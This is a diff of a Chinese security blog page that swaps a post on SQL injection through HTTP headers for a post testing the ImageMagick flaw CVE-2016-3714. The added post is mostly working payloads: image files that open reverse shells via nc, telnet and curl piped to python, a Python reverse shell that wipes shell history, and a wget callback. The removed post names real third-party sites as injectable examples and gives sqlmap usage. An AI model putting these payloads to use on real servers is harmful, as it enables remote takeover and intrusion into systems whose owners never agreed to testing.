@@ -64,7 +64,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="注入技巧," />
+  <meta name="keywords" content="poc," />
 
 
 
@@ -80,34 +80,21 @@
 
 
 
-<meta name="description" content="常见http可能被污染的参数有这些
-
-- User-agent 浏览器版本 （少）
-- Referer      来源（少）
-- X-Forwarded-For 获取ip（高）
-- client_ip   获取ip（高）
--cookie      获取cookie值（高）">
+<meta name="description" content="&amp;emsp;&amp;emsp;5月3日，图像处理软件ImageMagick就被公布出一个严重的0day漏洞(CVE-2016-3714)，攻击者通过此漏洞可执行任意命令，最终窃取重要信息取得服务器控制权。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HTTP请求头信息的注入">
-<meta property="og:url" content="http://yoursite.com/2016/04/13/HTTP请求头信息的注入/index.html">
+<meta property="og:title" content="ImageMagick 漏洞测试">
+<meta property="og:url" content="http://yoursite.com/2016/05/12/ImageMagick漏洞测试/index.html">
 <meta property="og:site_name" content="wps2015的博客">
-<meta property="og:description" content="常见http可能被污染的参数有这些
-
-- User-agent 浏览器版本 （少）
-- Referer      来源（少）
-- X-Forwarded-For 获取ip（高）
-- client_ip   获取ip（高）
--cookie      获取cookie值（高）">
-<meta property="og:updated_time" content="2016-05-15T12:35:12.981Z">
+<meta property="og:description" content="&amp;emsp;&amp;emsp;5月3日，图像处理软件ImageMagick就被公布出一个严重的0day漏洞(CVE-2016-3714)，攻击者通过此漏洞可执行任意命令，最终窃取重要信息取得服务器控制权。">
+<meta property="og:image" content="https://img.alicdn.com/imgextra/i1/792076116/TB2tD8LoFXXXXbNXFXXXXXXXXXX_!!792076116.png">
+<meta property="og:image" content="https://img.alicdn.com/imgextra/i2/792076116/TB2UKp5oFXXXXbIXpXXXXXXXXXX_!!792076116.png">
+<meta property="og:image" content="https://img.alicdn.com/imgextra/i4/792076116/TB2v4GmoFXXXXb7XXXXXXXXXXXX_!!792076116.png">
+<meta property="og:image" content="https://img.alicdn.com/imgextra/i2/792076116/TB2qROpoFXXXXblXpXXXXXXXXXX_!!792076116.png">
+<meta property="og:updated_time" content="2016-05-15T12:40:07.280Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="HTTP请求头信息的注入">
-<meta name="twitter:description" content="常见http可能被污染的参数有这些
-
-- User-agent 浏览器版本 （少）
-- Referer      来源（少）
-- X-Forwarded-For 获取ip（高）
-- client_ip   获取ip（高）
--cookie      获取cookie值（高）">
+<meta name="twitter:title" content="ImageMagick 漏洞测试">
+<meta name="twitter:description" content="&amp;emsp;&amp;emsp;5月3日，图像处理软件ImageMagick就被公布出一个严重的0day漏洞(CVE-2016-3714)，攻击者通过此漏洞可执行任意命令，最终窃取重要信息取得服务器控制权。">
+<meta name="twitter:image" content="https://img.alicdn.com/imgextra/i1/792076116/TB2tD8LoFXXXXbNXFXXXXXXXXXX_!!792076116.png">
 
 
 
@@ -125,7 +112,7 @@
   };
 </script>
 
-  <title> HTTP请求头信息的注入 | wps2015的博客 </title>
+  <title> ImageMagick 漏洞测试 | wps2015的博客 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -275,7 +262,7 @@
             
             
               
-                HTTP请求头信息的注入
+                ImageMagick 漏洞测试
               
             
           </h1>
@@ -287,8 +274,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-04-13T09:36:32+08:00" content="2016-04-13">
-              2016-04-13
+            <time itemprop="dateCreated" datetime="2016-05-12T00:00:00+08:00" content="2016-05-12">
+              2016-05-12
             </time>
           </span>
 
@@ -317,8 +304,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/04/13/HTTP请求头信息的注入/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/04/13/HTTP请求头信息的注入/" itemprop="commentsCount"></span>
+                <a href="/2016/05/12/ImageMagick漏洞测试/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/05/12/ImageMagick漏洞测试/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -341,34 +328,15 @@
       
 
       
-        <blockquote>
-<p>常见http可能被污染的参数有这些</p>
-</blockquote>
-<pre><code>- User-agent 浏览器版本 （少）
-- Referer      来源（少）
-- X-Forwarded-For 获取ip（高）
-- client_ip   获取ip（高）
--cookie      获取cookie值（高）
-</code></pre><a id="more"></a>
-<h3 id="一-cookie注入"><a href="#一-cookie注入" class="headerlink" title="一. cookie注入"></a>一. cookie注入</h3><ol>
-<li>原理： 在ASP中,request对象获取客户端提交数据常用的是get和post两种方式,同时request对象可以不通过集合来获得数据,即直接使用”request(“name”)”. 但它效率低下,容易出错,当我们省略具体的集合名称时,asp是按QueryString(get),Form(post),Cookie,Severvariable,集合的顺序来搜索的.cookie是保存在客户端的一个文本文件,可以进行修改,这样一来,就可以利用Request.cookie方式来提交变量的值,从而利用系统的漏洞进行注入攻击.</li>
-<li>条件1是程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。条件2，在1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取。</li>
-<li><p>首先 我们需要找到一个注入点，如果是使用get方式提交的参数，要更改成cookie方式提交，我们首先要访问正常的存在注入点的页面，等页面完全打开之后，在开发者环境的console栏中，输入alert(document.cookie=”id=”+escape(“x”)); 这里的“id=”便是注入点中注入参数，x便是页面的参数的数值了，这两处要根据实际情况来定义。写完之后按下回车网页中会弹出一个对话框现在更改好了cookie后我们就要试下能不能正常访问了，现在在另外一个窗口中重新打开那个注入点既是将“id=x”去掉后的，然后看是否能正常访问。如果去掉之后能够继续访问 那么说明可以进行cookie注入，这样就说明程序在使用request对象获取数据的时候并未指明具体使用什么方法来获取，而是直接使用request(“xx”)的方式。<br>4.实例 <a href="http://sef.xjtu.edu.cn/news_content.asp?id=2074" target="_blank" rel="external">http://sef.xjtu.edu.cn/news_content.asp?id=2074</a></p>
-<h3 id="二-X-Forwarded-For注入"><a href="#二-X-Forwarded-For注入" class="headerlink" title="二.  X-Forwarded-For注入()"></a>二.  X-Forwarded-For注入()</h3><ol>
-<li>X-Forwarded-For是HTTP头的一个字段。它被认为是客户端通过HTTP代理或者负载均衡器连接到web服务端获取源ip地址的一个标准。</li>
-<li>X-Forwarded-For注入常见于检测用户ip是否合法，进行sql查询的时没有过滤获取ip的参数。</li>
-<li>利用方法，可以用firefox中的X-Forwarded-For Header插件。或者将抓的头信息的包保存在sqlmap的根路径，比如test.txt，python sqlmap.py -r test.txt –level 3</li>
-</ol>
-</li>
-<li><p>实例：<a href="http://www.alexa.cn/" target="_blank" rel="external">http://www.alexa.cn/</a></p>
-<h3 id="三-User-agent注入"><a href="#三-User-agent注入" class="headerlink" title="三.  User-agent注入"></a>三.  User-agent注入</h3><p>用户代理（user agent）是记录软件程序的客户端信息的HTTP头字段，他可以用来统计目标和违规协议。在HTTP头中应该包含它，这个字段的第一个空格前面是软件的产品名称，后面有一个可选的斜杠和版本号。并不是所有的应用程序都会被获取到user-agent信息，但是有些应用程序利用它存储一些信息（如：购物车）。在这种情况下，我们就有必要研究下user-agent头存在的问题了。HTTP查询实例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: [host]</span><br><span class="line">User-Agent: aaa’ or 1/*</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h3 id="四-Referer注入"><a href="#四-Referer注入" class="headerlink" title="四. Referer注入"></a>四. Referer注入</h3><p>Referer是另外一个当应用程序没有过滤存储到数据库时，容易发生SQL注入的HTTP头。它是一个允许客户端指定的可选头部字段，通过它我们可以获取到提交请求URI的服务器情况。它允许服务器产生一系列的回退链接文档，像感兴趣的内容，日志等。它也允许跟踪那些坏链接以便维护。</p>
-<p>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: [host]</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36</span><br><span class="line"></span><br><span class="line">Referer: http://www.yaboukir.com&apos;</span><br></pre></td></tr></table></figure></p>
-<p>实例：<a href="http://baike.cardbaobao.com/index.php?user-login" target="_blank" rel="external">http://baike.cardbaobao.com/index.php?user-login</a></p>
-<h3 id="五-防止消息头注入漏洞"><a href="#五-防止消息头注入漏洞" class="headerlink" title="五. 防止消息头注入漏洞"></a>五. 防止消息头注入漏洞</h3><p>&emsp;&emsp;防止HTTP消息头注入漏洞的最有效方法是，不将用户控制的输入插入到应用程序返回的HTTP消息头中。通常我们可以用一些较为安全的方法代替这种行为。<br>&emsp;&emsp;如果不可避免地要在HTTP消息头中插入用户控制的数据，那么应用程序应采取以下这种双重深层防御方法防止漏洞产认。应用程序应根据情形，对插入的数据进行尽可能严格的确认。例如，如果根据用户输入设定一个cookie值，那么应当限制这个值仅包含字母字符，最大长度为6B。<br>&emsp;&emsp;应对插入消息头的每一个数据进行过滤，检测可能的恶意字符。实际上，任何ASCII码小于0x20的字符都应被视为可疑的恶意字符，应用程序应拒绝包含这些字符的请求。通过对所有应用程序内容使用 HTTPS，应用程序即可防止攻击者利用任何残留的消息头注入漏洞”毒害”代理服务器缓存。</p>
+        <p>&emsp;&emsp;5月3日，图像处理软件ImageMagick就被公布出一个严重的0day漏洞(CVE-2016-3714)，攻击者通过此漏洞可执行任意命令，最终窃取重要信息取得服务器控制权。<a id="more"></a>由此漏洞延伸，ImageMagick被许多编程语言所支持，包括Perl，C++，PHP（通过imagick拓展），Python和Ruby等，并被部署在数以百万计的网站，博客，社交媒体平台和流行的内容管理系统(CMS)，例如WordPress和Drupal。<br>&emsp;&emsp;利用这个漏洞，可以通过上传一张含有恶意代码的图片，可导致命令执行。这里我们主要讲的是如何测试漏洞，可以写文件、反弹shell、wget等。本地搭建一个测试环境，在kali2.0中，lamp环境下，安装了php的imagick扩展，调用ImageMagick进行上传的图片处理<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>]&gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $dest_file = <span class="string">"./images/"</span>.md5(uniqid(rand())).<span class="string">".png"</span>;</span><br><span class="line">    $thumb = <span class="keyword">new</span> Imagick();</span><br><span class="line">    $thumb-&gt;readImage($temp_file);</span><br><span class="line">    $thumb-&gt;writeImage($dest_file);</span><br><span class="line">    $thumb-&gt;clear();</span><br><span class="line">    $thumb-&gt;destroy();</span><br><span class="line">    unlink($temp_file);</span><br><span class="line">    <span class="keyword">echo</span> $dest_file;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>1. netcat</strong><br>前提是server服务器上安装了netcat，poc如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://example.com/image.jpg&quot;|nc xxx.xxx.xxx.xxx 2015 -e /bin/bash&quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure></p>
+<p>在反弹的监听主机上监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 2015</span><br></pre></td></tr></table></figure></p>
+<p>测试处，点击上传后<br><img src="https://img.alicdn.com/imgextra/i1/792076116/TB2tD8LoFXXXXbNXFXXXXXXXXXX_!!792076116.png" alt=""><br><strong>2. telnet</strong><br>telnet在linux的各大发行版中telnet一般默认安装，poc如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://example.com/image.jpg&quot;|telnet x.x.x.x 2015&quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure></p>
+<p>在反弹的监听主机上监听，指令同上<br><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2UKp5oFXXXXbIXpXXXXXXXXXX_!!792076116.png" alt=""><br><strong>3. curl&amp;python</strong><br>利用curl下载python文件后，执行python脚本反弹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://1&quot;||curl -sS http://x.x.x.x/test.py | python&quot;)&apos;</span><br><span class="line">pop graphic-contex</span><br></pre></td></tr></table></figure></p>
+<p>这里需要一个外网服务器存放你的脚本,python脚本内容如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,socket,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">"x.x.x.x"</span>,<span class="number">2015</span>));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);os.unsetenv(<span class="string">"HISTFILE"</span>);os.unsetenv(<span class="string">"HISTFILESIZE"</span>);os.unsetenv(<span class="string">"HISTSIZE"</span>);os.unsetenv(<span class="string">"HISTORY"</span>);os.unsetenv(<span class="string">"HISTSAVE"</span>);os.unsetenv(<span class="string">"HISTZONE"</span>);os.unsetenv(<span class="string">"HISTLOG"</span>);os.unsetenv(<span class="string">"HISTCMD"</span>);os.putenv(<span class="string">"HISTFILE"</span>,<span class="string">"/dev/null"</span>);os.putenv(<span class="string">"HISTSIZE"</span>,<span class="string">"0"</span>);os.putenv(<span class="string">"HISTFILESIZE"</span>,<span class="string">"0"</span>);pty.spawn(<span class="string">"/bin/sh"</span>);s.close()</span><br></pre></td></tr></table></figure></p>
+<p>注意更改脚本里的反弹ip和端口，测试成功<br><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2v4GmoFXXXXb7XXXXXXXXXXXX_!!792076116.png" alt=""><br><strong>4. wget</strong><br>在远程服务上写个php脚本记录访问ip，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">file_put_contents(<span class="string">"log.txt"</span>, <span class="string">"ping from "</span>.$ip, FILE_APPEND);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>poc如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://example.com/image.jpg&quot;|wget http://x.x.x.x/img.php&quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure></p>
+<p>命令执行成功，则在log.txt中会记录来访ip<br><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2qROpoFXXXXblXpXXXXXXXXXX_!!792076116.png" alt=""></p>
 
       
     </div>
@@ -389,7 +357,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/注入技巧/" rel="tag">#注入技巧</a>
+            <a href="/tags/poc/" rel="tag">#poc</a>
           
         </div>
       
@@ -406,8 +374,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2016/05/10/ImageMagick漏洞测试/" rel="prev" title="ImageMagick 漏洞测试">
-                ImageMagick 漏洞测试 <i class="fa fa-chevron-right"></i>
+              <a href="/2016/05/12/利用phantomjs+selenium抓取js执行后的结果/" rel="prev" title="利用phantomjs+selenium抓取js执行后的结果">
+                利用phantomjs+selenium抓取js执行后的结果 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -434,8 +402,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/04/13/HTTP请求头信息的注入/"
-           data-title="HTTP请求头信息的注入" data-url="http://yoursite.com/2016/04/13/HTTP请求头信息的注入/">
+      <div class="ds-thread" data-thread-key="2016/05/12/ImageMagick漏洞测试/"
+           data-title="ImageMagick 漏洞测试" data-url="http://yoursite.com/2016/05/12/ImageMagick漏洞测试/">
       </div>
     
   </div>
@@ -589,7 +557,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一-cookie注入"><span class="nav-number">1.</span> <span class="nav-text">一. cookie注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二-X-Forwarded-For注入"><span class="nav-number">2.</span> <span class="nav-text">二.  X-Forwarded-For注入()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三-User-agent注入"><span class="nav-number">3.</span> <span class="nav-text">三.  User-agent注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四-Referer注入"><span class="nav-number">4.</span> <span class="nav-text">四. Referer注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#五-防止消息头注入漏洞"><span class="nav-number">5.</span> <span class="nav-text">五. 防止消息头注入漏洞</span></a></li></ol></div>
+              <p class="post-toc-empty">此文章未包含目录</p>
             
           </div>
         </section>
